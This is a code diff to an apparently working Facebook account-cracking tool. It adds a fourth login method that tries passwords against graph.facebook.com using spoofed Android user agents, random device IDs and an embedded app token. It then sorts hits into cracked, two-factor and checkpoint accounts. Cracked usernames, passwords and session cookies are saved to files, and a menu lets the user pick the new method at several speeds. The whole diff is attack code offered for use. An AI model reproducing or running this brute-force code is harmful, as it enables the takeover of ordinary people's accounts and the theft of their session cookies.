@@ -857,7 +857,7 @@ class crack:
                 gttt=str(random.choice(string.ascii_uppercase))+str(random.randrange(11,99))+str(''.join(random.choice(string.ascii_uppercase) for _ in range(random.choice(uo))))
                 net=random.choice(['ZONG', 'Jazz'])
                 #ua_string = f'[F#BAN/FB4A;FBAV/{application_version};FBBV/{application_version_code};FBDM/'+'%{density=+str(density)+,width=+str(width)+,height=+str(height)+};FBLC/+str(FBLC)+;FBRV/0;FBCR/+str(FBCR)+;FBMF/+str(mixmodel)+;FBBD/+str(mixmodel)+;FBPN/+str(FBPN)+;FBDV/+str(model4)+;FBSV/+str(FBSV)+;FBOP/+str(FBOP)+;FBDM/FBCA/+str(FBCA)+:]'
-                ua_string = f'[FBAN/FB4A;FBAV/{application_version};FBBV/{application_version_code};FBDM/'+'{density=1.0,width=1280,height=752};FBLC/en_US;FBCR/o2 - de;FBPN/com.facebook.katana;FBDV/Lenovo B8000-H;FBSV/4.2.2;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
+                ua_string = f'[FBAN/FB4A;FBAV/{application_version};FBBV/{application_version_code};FBDM/'+'{density=2.98,width=1532,height=832};FBLC/pk_PK;FBCR/TIGO;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.lite;FBDV/SM-T231;FBSV/11.9;FBOP/1;FBCA/armeabi-v7a:armeabi]'
                 device = str(uuid.uuid4())
                 adid = str(uuid.uuid4())
                 data = {
@@ -983,7 +983,147 @@ class crack:
                 time.sleep(5)
         self.loop += 1
 
+    def __mmb9__(self,user,__juts__,_jat):
+        global ok,cp,f2,tl
+        sys.stdout.write(f'\r{PP}[M4] {VV}{self.loop}/{len(self.id)} OK:{len(ok)} '),
+        sys.stdout.flush()
+        for pw in __juts__:
+            try:
+                application_version = str(random.randint(300,396))+'.0.0.'+str(random.randrange(10,49))+'.'+str(random.randint(111,396))
+                application_version_code=str(random.randint(000000000,999999999))
+                fbs=random.choice(fbks)
+                android_version=str(random.randrange(5,13))
+                sm=['GT-', 'SM-']
+                uo=[2,3,4]
+                b=str(random.choice(string.ascii_uppercase))
+                gtt = random.choice(sm)+b+str(''.join(random.choice(string.digits) for _ in range(random.choice(uo)))+str(random.choice(string.ascii_uppercase)))
+                gttt=str(random.choice(string.ascii_uppercase))+str(random.randrange(11,99))+str(''.join(random.choice(string.ascii_uppercase) for _ in range(random.choice(uo))))
+                net=random.choice(['ZONG', 'Jazz'])
+                #ua_string = f'[F#BAN/FB4A;FBAV/{application_version};FBBV/{application_version_code};FBDM/'+'%{density=+str(density)+,width=+str(width)+,height=+str(height)+};FBLC/+str(FBLC)+;FBRV/0;FBCR/+str(FBCR)+;FBMF/+str(mixmodel)+;FBBD/+str(mixmodel)+;FBPN/+str(FBPN)+;FBDV/+str(model4)+;FBSV/+str(FBSV)+;FBOP/+str(FBOP)+;FBDM/FBCA/+str(FBCA)+:]'
+                ua_string = f'[FBAN/FB4A;FBAV/{application_version};FBBV/{application_version_code};FBDM/'+'{density=2.98,width=1532,height=832};FBLC/pk_PK;FBCR/TIGO;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.lite;FBDV/SM-T231;FBSV/11.9;FBOP/1;FBCA/armeabi-v7a:armeabi]'
+                device = str(uuid.uuid4())
+                adid = str(uuid.uuid4())
+                data = {
+					"adid": adid,
+					"format": "json",
+					"device_id": device,
+					"cpl": "true",
+					"enroll_misauth": "false",
+                    "family_device_id": device,
+                    "credentials_type": "device_based_login_password",
+                    "error_detail_type": "button_with_disabled",
+                    "source": "device_based_login",
+                    "email": user,
+                    "password": pw,
+                    "access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
+                    "generate_session_cookies": "1",
+                    "meta_inf_fbmeta": "V2_UNTAGGED",
+                    "encrypted_msisdn": "",
+                    "advertiser_id": str(uuid.uuid4()),
+                    "currently_logged_in_userid": "0",
+                    "locale": "pk_ID",
+                    "client_country_code": "NP",
+                    "try_num":"1",
+                    "method": "auth.login",
+                    "fb_api_req_friendly_name": "authenticate",
+                    "flow": "CONTROLLER_INITIALIZATION",
+                    "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
+                    "api_key": "882a8490361da98702bf97a021ddc14d"}
+                head={'user-agent':ua_string,
+                    'Content-Type': 'application/x-www-form-urlencoded',
+                    'Host': 'graph.facebook.com',
+                    'X-FB-Net-HNI': str(random.randint(20000, 40000)),
+                    'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
+                    'X-FB-Connection-Type': 'MOBILE.LTE',
+                    'X-Tigon-Is-Retry': 'False',
+                    'x-fb-session-id': 'nid=Mso5GuuBAsKF;pid=Main;tid=950;nc=7;fc=1;bc=8;cid=6193c421e6af4941fa9e41ef43438876',
+                    'x-fb-device-group': '1743',
+                    'X-FB-Friendly-Name': 'ViewerReactionsMutation',
+                    'X-FB-Request-Analytics-Tags': 'graphservice',
+                    'X-FB-HTTP-Engine': 'Liger',
+                    'X-FB-Client-IP': 'True',
+                    'X-FB-Server-Cluster': 'True',
+                    'x-fb-connection-token': '6193c421e6af4941fa9e41ef43438876',
+				}
+                po = requests.post(_jat,data=data,headers=head).text
+                q = json.loads(po)
+                if 'session_key' in str(q) or 'c_user' in str(q):
+                    try:
+                        used=str(q['uid'])
+                        tokic=str(q['access_token'])
+                    except:
+                        used=user
+                        tokic='lol'
+                    if used in ok or used in tl:
+                        break
+                    coki = []
+                    for x in q['session_cookies']:
+                        coki.append(x['name']+'='+x['value']+';')
+                    cokie = coki[3]+coki[2]+coki[0]+coki[1]
+                    try:
+                        me=requests.get('https://graph.facebook.com/me?access_token='+tokic, cookies={'cookie':cokie}).json()
+                        name=me['name']
+                        idd=me['id']
+                        print(f"\r{HH}[OK-GSXD] {used} | {pw} {VV}  ")
+                        #print(f"\#r{HH}[#OK-GSXD] {used} | {pw} | {cokie} {VV} 			   ")
+                        open("/sdcard/GS-2X-IDS/M4- IDS/M3-GSXD_OK.TXT", "a").write(used + "|" + pw + "\n")
+                        open("/sdcard/GS-2X-IDS/M4- IDS/M3-GSXD_COKIE.TXT", "a").write(used + "|" + pw + "|" + cokie + "	\n")
+                        ok.append(used + pw)
+                        break
+                    except KeyError:
+                        #print(f"\r\033[1#;33m[TL-GSXD] {used} | {pw} {VV}    ")
+                        tl.append(used + pw)
+                        break
+                elif "Login approvals are on" in str(q) or "two_factor" in str(q):
+                    Mm = '\033[9;31m'
+                    try:
+                        used = str(q['error']['error_data']['uid'])
+                    except:
+                        try:
+                            ds = str(q['error_data']).split(':')[2]
+                            used = ds.split(',')[0]
+                        except:
+                            used=user
+                    if len(used)<11 or len(used)>15:
+                        used = user
+                    #print(f"\r{#Mm}[2F-GSXD] {used} | {pw}{VV}     ")
+                    open("/sdcard/GS-2X-IDS/LOCK IDS/GSXD_2F.txt", "a").write(used + "|" + pw + "\n")
+                    f2.append(used + pw)
+                    break
+                elif 'User must verify their account' in str(q):
+                    try:
+                        used = str(q['error']['error_data']['uid'])
+                    except:
+                        try:
+                            if 'cookie'+'='+'\\' in str(q):
+                                used = str(q['error_data']).split('cookie'+'='+'\\')[1][32:47]
+                            elif 'cookie'+'='+'%7B%22u%22%3A' in str(q):
+                                used = str(q['error_data']).split('cookie'+'='+'%7B%22u%22%3A')[1][:15]
+                            elif 'cookie'+'=' not in str(q):
+                                used = user
+                        except:
+                            try:
+                                if 'cookie'+'='+'\\' in str(q):
+                                    used = str(q['error']['error_data']).split('cookie'+'='+'\\')[1][32:47]
+                                elif 'cookie'+'='+'%7B%22u%22%3A' in str(q):
+                                    used = str(q['error']['error_data']).split('cookie'+'='+'%7B%22u%22%3A')[1][:15]
+                                elif 'cookie'+'=' not in str(q):
+                                    used = user
+                            except:
+                                used=user
+                    if len(used)<11 or len(used)>15:
+                        used = user
+                    #print(f"\r{EE#}[CP-GSXD] {used} | {pw} {VV}    ")
+                    open("/sdcard/GS-2X-IDS/LOCK IDS/GSXD_CP.txt", "a").write(used + "|" + pw + "\n")
+                    cp.append(used + pw)
+                    break
+                else:
+                    continue
+            except requests.exceptions.ConnectionError:
+                time.sleep(5)
+        self.loop += 1
         
+       
     def cek_cp(self,user,pw):
         global ok,cp,f2
         data = {}
@@ -1278,9 +1418,10 @@ class crack:
             print ('\033[1;32m[1] METHOD 1')
             print ('\033[1;32m[2] METHOD 2')
             print ('\033[1;32m[3] METHOD 3')
+            print ('\033[1;32m[3] METHOD 4+')
             print (43*'-')
             vz = input('\033[1;36mSelect: \033[0;97m')
-            if vz in ['1', '2', '3']:
+            if vz in ['1', '2', '3', '4']:
                 print ('\033[1;32m[1] CRACK (FAST)')
                 print ('\033[1;32m[2] CRACK (SLOW)')
                 print ('\033[1;32m[3] CRACK (SUPER SLOW)\033[0;97m')
@@ -1324,6 +1465,12 @@ class crack:
                                 __GSXDTEAM__.submit(self.__mmb__,uid,pwx,url2)
                             elif vz == '3' and uz == '3':
                                 __GSXDTEAM__.submit(self.__mmb__,uid,pwx,url3)
+                            elif vz == '4' and uz == '1':
+                                __GSXDTEAM__.submit(self.__mmb9__,uid,pwx,url1)
+                            elif vz == '4' and uz == '2':
+                                __GSXDTEAM__.submit(self.__mmb9__,uid,pwx,url2)
+                            elif vz == '4' and uz == '3':
+                                __GSXDTEAM__.submit(self.__mmb9__,uid,pwx,url3)
                             
                             else:
                                 __GSXDTEAM__.submit(self.__free__,uid,pwx,url1)
